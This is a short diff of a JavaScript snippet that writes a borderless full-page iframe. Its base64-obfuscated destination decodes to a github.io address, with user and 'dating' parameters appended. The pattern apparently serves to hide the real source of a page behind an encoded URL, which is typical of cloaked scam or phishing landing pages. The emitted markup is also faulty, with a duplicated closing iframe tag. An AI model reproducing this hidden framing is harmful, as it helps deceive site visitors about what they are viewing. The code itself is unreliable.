@@ -25,4 +25,4 @@ if(f){
 	var fp = 'ZGF0aW5n';
 }
 document.write("<iframe name='site' id='site' width='100%' height='100%' frameborder='0' marginheight='0' marginwidth='0' src='"
-	+ decode('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8') + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
+	+ atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8') + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
